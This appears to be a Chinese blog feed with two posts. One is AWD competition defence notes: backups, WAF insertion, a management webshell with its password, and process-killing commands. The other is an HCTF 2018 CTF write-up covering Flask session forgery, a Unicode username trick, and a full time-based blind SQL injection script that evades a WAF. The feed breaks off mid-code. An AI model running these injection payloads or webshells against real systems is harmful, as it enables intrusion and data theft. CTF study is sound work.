    <content type="html"><![CDATA[<h1 id="awd"><a href="#awd" class="headerlink" title="awd"></a>awd</h1><p>waf流量代理还有问题， 静态资源得根据绝对路径和相对路径来分别判断<br>提权脚本<br>批量改密码<br>杀不死马方法测试<br>diff或者compare<br>测试一遍运维流程<br>飞鸽传书</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>改密码<br>ssh(弱口令)</li></ol><ul><li>进入真终端<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></li></ul><ol start="2"><li>web备份</li></ol><ul><li>备份</li></ul><p><code>tar -zcvf /tmp/web.tar.gz /var/www/html</code></p><p>一定要用绝对路径</p><ul><li>恢复</li></ul><p><code>tar -zxvf /tmp/web.tar.gz</code></p><ol start="3"><li>数据库备份</li></ol><ul><li>备份</li></ul><p><code>mysqldump --all-databases -uroot -p &gt; /tmp/mysql.sql</code></p><ul><li>恢复</li></ul><p><code>mysql -uroot -p source /tmp/mysql.sql</code><br>①. 先进数据库终端<br><code>mysql -uroot -p</code><br>②. 恢复数据<br><code>source /tmp/mysql.sql</code></p><ol start="4"><li>先上waf<br>记得存banip</li></ol><!--waf文件设置为644，视管理权限而定，如果管理权限和网站访问权限统一为 www 的话.....就444吧注意waf的设置，先看web服务，如果是类似 thinkphp 这类仅仅只有统一入口的话，就只需要在 admin.php 、index.php 等主要入口文件处 include_once 即可，如果不是的话，也要确定是否是功能分块，甚至是每个 php 文件都能访问到1. 如果仅仅是功能分块，仅仅需要在功能的入口点include即可（功能分块，例如：member、admin、home 是单独的文件夹，里面的控制器不可访问，但是可以通过 site/member/index.php 、site/admin/index.php 、 site/home/login.php 诸如此类，由功能模块目录下的少数入口点进入，然后可以访问到各个功能的更细小的功能点）2. 如果是每个 php 文件都能访问到，那就简单粗暴一点，所有可写的 php 文件都 include 一次，但是注意在布置防御时，记得自己测试一下各个功能点是否能够正常访问，多次 include 有时候也会出现一丢丢问题--><p>waf位置：/防御/批量上waf/d0g3w.md<br>上waf脚本：/防御/批量上waf/TakeItBoy.sh</p><ul><li><p>修改文件TakeItBoy.sh中payload值为要插入的包含文件的代码<br>默认：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=&quot;&lt;?php include_once(&apos;/tmp/d0g3w.md&apos;);?&gt;&quot;</span><br></pre></td></tr></table></figure></li><li><p>给/app目录批量上waf<br>./TakeItBoy.sh -i /app</p></li><li><p>删除/app目录下waf<br>./TakeItBoy.sh -c /app</p></li><li><p>指定白名单/app/admin不上waf<br>./TakeItBoy.sh -c /app -w /app/admin</p></li><li><p>指定白名单下waf<br>必须和之前上waf所跟的-w参数配套，因为下waf是删除的所有文件的第一行<br>./TakeItBoy.sh -c /app -w /app/admin</p></li></ul><ol start="5"><li>传管理的shell<br>位置：/运维/运维shell/d0g3coop.php</li></ol><p>用法：ip[:port]/d0g3coop.php?sig=d0g34eva 密码d0g3_eva</p><ol start="6"><li>chmod555<br>一定要waf上完再执行，然后如果没有权限555， 就用运维的马去执行<br>chmod -R 555 /www </li></ol><ol start="9"><li>以www权限运行删session脚本<br>位置：/防御/运维/清session/cleanner.sh<br>cd /tmp<br>chomod +x cleanner.sh<br>./cleanner.sh</li></ol><p>这个要小心使用，首先应该查看web所在的目录，脚本里默认的是在 /var 下<br>/var/lib/php/session/ 这个是session，注意核对<br>/var/tmp 是临时文件</p><ol start="10"><li>修复漏洞后再备份一次</li></ol><ul><li>备份</li></ul><p><code>tar -zcvf /tmp/web.tar.gz /var/www/html</code></p><p>一定要用绝对路径</p><ul><li>恢复</li></ul><p><code>tar -zxvf web.tar.gz</code></p><ol start="11"><li>找check机ip，改waf，改静态页面</li></ol><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="各种修洞的代码"><a href="#各种修洞的代码" class="headerlink" title="各种修洞的代码"></a>各种修洞的代码</h3><h4 id="防注入"><a href="#防注入" class="headerlink" title="防注入"></a>防注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">foreach ($_GET as $key =&gt; $value) &#123;</span><br><span class="line">$_GET[$key] = filter_dangerous_words($value);</span><br><span class="line">&#125;</span><br><span class="line">function filter_dangerous_words($str)&#123;</span><br><span class="line">$str = str_replace(&quot;&apos;&quot;, &quot;‘&quot;, $str);</span><br><span class="line">$str = str_replace(&quot;\&quot;&quot;, &quot;“&quot;, $str);</span><br><span class="line">$str = str_replace(&quot;&lt;&quot;, &quot;《&quot;, $str);</span><br><span class="line">$str = str_replace(&quot;&gt;&quot;, &quot;》&quot;, $str);</span><br><span class="line">$str = str_replace(&quot;)&quot;, &quot;）&quot;, $str);</span><br><span class="line">$str = str_replace(&quot;(&quot;, &quot;（&quot;, $str);</span><br><span class="line">return $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="防上传"><a href="#防上传" class="headerlink" title="防上传"></a>防上传</h4><h4 id="删反弹shell命令"><a href="#删反弹shell命令" class="headerlink" title="删反弹shell命令"></a>删反弹shell命令</h4><p>查看pid： ps -aux<br>删进程： kill -9 pid</p><h4 id="清不死马"><a href="#清不死马" class="headerlink" title="清不死马"></a>清不死马</h4><p>以www-data运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    while (1) &#123;</span><br><span class="line">        $pid=1234;</span><br><span class="line">        @unlink(&apos;shell.php&apos;);</span><br><span class="line">        exec(&apos;kill -9 $pid&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>或者：<br>killall apache2<br>ps -aux|grep ‘www-data’|awk ‘{print $2}’|xargs kill -9</p><h2 id="flag提交"><a href="#flag提交" class="headerlink" title="flag提交"></a>flag提交</h2><h3 id="自动交flag脚本"><a href="#自动交flag脚本" class="headerlink" title="自动交flag脚本"></a>自动交flag脚本</h3><p>涉及到几种情况：</p><ol><li>不一定要拿到shell就可以读flag的：ssrf，任意文件读取，命令执行等等，写好对应交flag脚本</li><li>拿到shell的，弹shell，维权，自动交flag型(回传flag？还是用拿下来的机器去请求flag服务器？)。</li></ol><p>参考：<a href="https://github.com/vidar-team/hctf_final_platform/blob/master/API_Public.md" target="_blank" rel="noopener">https://github.com/vidar-team/hctf_final_platform/blob/master/API_Public.md</a></p><h4 id="目标机访问flag服务器获取flag"><a href="#目标机访问flag服务器获取flag" class="headerlink" title="目标机访问flag服务器获取flag"></a>目标机访问flag服务器获取flag</h4><h4 id="flag生成在各个服务器上，需要文件读取的形式获取flag"><a href="#flag生成在各个服务器上，需要文件读取的形式获取flag" class="headerlink" title="flag生成在各个服务器上，需要文件读取的形式获取flag"></a>flag生成在各个服务器上，需要文件读取的形式获取flag</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;awd&quot;&gt;&lt;a href=&quot;#awd&quot; class=&quot;headerlink&quot; title=&quot;awd&quot;&gt;&lt;/a&gt;awd&lt;/h1&gt;&lt;p&gt;waf流量代理还有问题， 静态资源得根据绝对路径和相对路径来分别判断&lt;br&gt;提权脚本&lt;br&gt;批量改密码&lt;br&gt;杀不死马方法测试&lt;br
      
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>hctf马后炮分析</title>
    <link href="http://yoursite.com/2018/11/18/hctf%E9%A9%AC%E5%90%8E%E7%82%AE%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2018/11/18/hctf马后炮分析/</id>
    <published>2018-11-18T07:24:00.000Z</published>
    <updated>2019-02-06T03:45:26.170Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h1><p>再随便输一个非 admin 的用户名即可进入后台，提示上传 ZIP 文件。上传的zip会被解压并读取。   </p><p>一开始还以为要上传 php 代码执行什么的，但php代码都被注释掉了。然后想到 JavaScript ，想通过xss打管理员的cookie，结果发现只能打到自己的cookie</p><p>Linux 的软链接文件就像 Windows 的快捷方式。通过 <code>ln  -s [目标文件] [生成文件]</code> 生成。    </p><h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><p>首先读取 /proc/self/environ 文件</p><p><strong>什么是proc目录</strong></p><ul><li><p>首先，它不是一个真正的文件系统， 而是一个<strong>虚拟的</strong>文件系统。   </p></li><li><p>其次，proc 文件系统是<strong>动态</strong>从系统内核读出所需信息的。   </p></li><li><p>最后，proc 存的是<strong>系统的信息</strong>， 如内存使用情况， cpu使用情况， 进程信息等等这些。   </p></li></ul><p>而 proc 下的 self 目录是到当前进程/proc目录的符号链接，通过这个目录可以获取当前运行进程的信息。其中的文件 environ 则是进程环境变量列表。<br>当前的运行的进程肯定有 Web 应用。所以在 /proc/self/environ 我们就可以发现 uWSGI 配置文件</p><p><img src="http://pbx0hfbct.bkt.clouddn.com/hctf/2.png" alt=""></p><p> <strong>uWSGI 配置文件</strong>   </p><p> python Web 开发时所用到的。一个web服务器，实现了WSGI协议、uwsgi协议、http协议等。   </p><p> <img src="http://pbx0hfbct.bkt.clouddn.com/hctf/8.png" alt=""></p><p>通过配置文件发现 </p><p><img src="http://pbx0hfbct.bkt.clouddn.com/hctf/3.png" alt="">    </p><p> <code>main.py</code> 的代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username=request.form[<span class="string">'username'</span>]</span><br><span class="line">    password=request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="keyword">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="keyword">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure><ul><li>登陆 admin 的账户即可得到 flag</li><li>登陆 admin 需要伪造 session</li></ul><p>session是通过SECREY_KEY加密生成的，这里 SECREY_KEY 的生成方式 — 通过随机数种子生成的随机数    </p><p><img src="http://pbx0hfbct.bkt.clouddn.com/hctf/6.png" alt=""> </p><p><strong>UUID</strong>：通用唯一标识符 ( Universally Unique Identifier )，对于所有的UUID它可以保证在空间和时间上的唯一性，也称为GUID。它的唯一性和一致性特点，使得可以无需注册过程就能够产生一个新的UUID；UUID可以被用作多种用途, 既可以用来短时间内标记一个对象，也可以可靠的辨别网络中的持久性对象。    </p><p>这里用于生成随机数的函数 uuid.getnode() 则是由 MAC 地址生成的    </p><p><img src="http://pbx0hfbct.bkt.clouddn.com/hctf/5.png" alt="">   </p><p>通过读取 /sys/class/net/eth0/address 可以得到 MAC 地址，再带入Python脚本生成 SECREY_KEY  </p><p><img src="http://pbx0hfbct.bkt.clouddn.com/hctf/7.png" alt="">  </p><p>最后伪造 admin 的 session 登入 admin 得到 flag </p><p>在<a href="http://admin.2018.hctf.io/change的页面源码里发现提示" target="_blank" rel="noopener">http://admin.2018.hctf.io/change的页面源码里发现提示</a></p><!-- https://github.com/woadsl1234/hctf_flask/ --><p>下载到源码，发现每次注册或者是登录的时候都会先将用户名转化成小写，另外修改密码的时候会取session[‘name’]并转化为小写，然后根据转化后的用户名更改密码，调用的函数是：</p><p>def strlower(username):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return username</span><br></pre></td></tr></table></figure><p>网上搜索得知，这个函数在处理unicode字符时有一些问题，例如\u1d35即ᴵ，经过这个函数会变成大写字母I，然后再调用一下就会变成小写字母i，所以思路就明显了，注册一个admᴵn的账号，登录进去修改admin的密码，然后再登录即可</p><p>#kzone<br>打开发现是一个QQ钓鱼站，主页会跳转到空间<br><a href="http://kzone.2018.hctf.io/www.zip" target="_blank" rel="noopener">http://kzone.2018.hctf.io/www.zip</a> 可以下载到源码<br>install.sql 文件中有admin密码，admin。<br>INSERT INTO fish_admin (id, username, password, name, qq, per) VALUES<br>(1, ‘admin’, ‘21232f297a57a5a743894a0e4a801fc3’, ‘小杰’, ‘1503816935’, 1);<br>不过登陆不上去，密码被改了</p><p><a href="http://www.zip可以下载到web源码，然后阅读源码，发现include/member.php提取了$_COOKIE[&#39;login_data&#39;]用于登录验证" target="_blank" rel="noopener">www.zip可以下载到web源码，然后阅读源码，发现include/member.php提取了$_COOKIE[&#39;login_data&#39;]用于登录验证</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$login_data = json_decode($_COOKIE[&apos;login_data&apos;], true);</span><br><span class="line">$admin_user = $login_data[&apos;admin_user&apos;];</span><br><span class="line">$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&apos;$admin_user&apos; limit 1&quot;);</span><br><span class="line">if ($udata[&apos;username&apos;] == &apos;&apos;) &#123;</span><br><span class="line">    setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">    setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">&#125;</span><br><span class="line">$admin_pass = sha1($udata[&apos;password&apos;] . LOGIN_KEY);</span><br><span class="line">if ($admin_pass == $login_data[&apos;admin_pass&apos;]) &#123;</span><br><span class="line">    $islogin = 1;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">    setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>密码判断用的是“==”可以用数字与字符串弱等于绕过，构造json串，其中密码从数字0开始爆破即可，爆破到65的时候成功登入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;admin_user&quot;:&quot;admin&quot;,&quot;admin_pass&quot;:65&#125;</span><br></pre></td></tr></table></figure></p><p>发现username还可以注入，不过有waf拦截，因此需要绕过，发现过滤了or，所以information_schema不能用，所以需要用mysql.innodb_table_stats来查数据库名表名<br>现F1444g表，不过不知道列名，这里用*发现就可以了，应该是只有一列，exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#!coding:utf-8#</span><br><span class="line"># xishir</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line">#hctf&#123;4526a8cbd741b3f790f95ad32c2514b9&#125;</span><br><span class="line"></span><br><span class="line">ss = &quot;&#123;&#125;_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-+&quot;</span><br><span class="line">r = requests.session()</span><br><span class="line">url = &quot;http://kzone.2018.hctf.io/admin/&quot;</span><br><span class="line">#url=&quot;http://127.0.0.1/hctf/www/admin/&quot;</span><br><span class="line"></span><br><span class="line">union = &apos;\u00&apos;+str(hex(ord(&apos;u&apos;)))[2:]+&apos;nion&apos;</span><br><span class="line">sleep = &apos;\u00&apos;+str(hex(ord(&apos;s&apos;)))[2:]+&apos;leep&apos;</span><br><span class="line">ascii = &apos;\u00&apos;+str(hex(ord(&apos;a&apos;)))[2:]+&apos;scii&apos;</span><br><span class="line">ok = &apos;\u00&apos;+str(hex(ord(&apos;=&apos;)))[2:]</span><br><span class="line">substr = &apos;\u00&apos;+str(hex(ord(&apos;s&apos;)))[2:]+&apos;ubstr&apos;</span><br><span class="line">over = &apos;\u00&apos;+str(hex(ord(&apos;#&apos;)))[2:]</span><br><span class="line">blank = &quot;/**/&quot;</span><br><span class="line">orr = &apos;\u00&apos;+str(hex(ord(&apos;o&apos;)))[2:]+&apos;r&apos;</span><br><span class="line"></span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    print i</span><br><span class="line">    for j in ss:</span><br><span class="line">        payload = &quot;admin&apos; and (substr((select binary F1a9 from F1444g limit 1),&quot;+str(i)+&quot;,1)=&apos;&quot;+str(j)+&quot;&apos;) and sleep(4) and 1=&apos;1&quot;</span><br><span class="line"></span><br><span class="line">        payload = payload.replace(&apos;sleep&apos;,sleep)</span><br><span class="line">        payload = payload.replace(&apos;union&apos;,union)</span><br><span class="line">        payload = payload.replace(&apos;=&apos;,ok)</span><br><span class="line">        payload = payload.replace(&apos;#&apos;,over)</span><br><span class="line">        payload = payload.replace(&apos; &apos;,blank)</span><br><span class="line">        payload = payload.replace(&apos;ascii&apos;,ascii)</span><br><span class="line">        payload = payload.replace(&apos;substr&apos;,substr)</span><br><span class="line">        payload = payload.replace(&apos;or&apos;,orr)</span><br><span class="line"></span><br><span class="line">        jsons = &apos;&#123;&quot;admin_user&quot;:&quot;&apos;+payload+&apos;&quot;,&quot;admin_pass&quot;:&quot;3b30a11aaba222edd6e704e9959b94643ed4ffd9&quot;&#125;&apos;</span><br><span class="line"></span><br><span class="line">        cookie=&#123;&quot;PHPSESSID&quot;:&quot;t0k91etf5fecbi4t25d7hprtm3&quot;,</span><br><span class="line">        &quot;islogin&quot;:&quot;1&quot;,</span><br><span class="line">        &quot;login_data&quot;:jsons&#125;</span><br><span class="line"></span><br><span class="line">        t1=time.time()</span><br><span class="line">        r1 = r.get(&quot;http://kzone.2018.hctf.io&quot;,cookies=cookie)</span><br><span class="line">        t2=time.time()</span><br><span class="line">        #print t2</span><br><span class="line">        if (t2-t1)&gt;4:</span><br><span class="line">            #print &quot;aaaaaaaa&quot;</span><br><span class="line">            flag+=str(j)</span><br><span class="line">            print i,flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>##kzone</p><p>打开发现是一个QQ钓鱼站，主页会跳转到qq空间<br><a href="http://kzone.2018.hctf.io/www.zip" target="_blank" rel="noopener">http://kzone.2018.hctf.io/www.zip</a> 可以下载到源码</p><p>install.sql 文件中有admin密码，admn。<br><figure class="highlight plain"><figcaption><span>INTO fish_admin (id, username, password, name, qq, per) VALUES</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1, &apos;admin&apos;, &apos;21232f297a57a5a743894a0e4a801fc3&apos;, &apos;小杰&apos;, &apos;1503816935&apos;, 1);</span><br></pre></td></tr></table></figure></p><p>不过登陆不上去，密码被改了</p><p>审计代码</p><p>admin文件夹：管理整个钓鱼网站，导出、查看、删除钓鱼信息</p><p>include文件：包含一些功能性文件</p><p>2018.php：钓鱼插入文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function waf($string)</span><br><span class="line">&#123;</span><br><span class="line">    $blacklist = &apos;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&apos;;</span><br><span class="line">    return preg_replace_callback($blacklist, function ($match) &#123;</span><br><span class="line">        return &apos;@&apos; . $match[0] . &apos;@&apos;;</span><br><span class="line">    &#125;, $string);</span><br><span class="line">&#125;</span><br><span class="line">一个全局过滤sql语句</span><br><span class="line">过滤了get,post,cookie</span><br><span class="line">但是http header应该没经过过滤，于是想到可否控制ip，然后达成insert注入</span><br></pre></td></tr></table></figure><p>跟进real_ip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function real_ip()</span><br><span class="line">&#123;</span><br><span class="line">    $ip = isset($_SERVER[&apos;REMOTE_ADDR&apos;]) ? $_SERVER[&apos;REMOTE_ADDR&apos;] : &apos;&apos;;</span><br><span class="line">    if 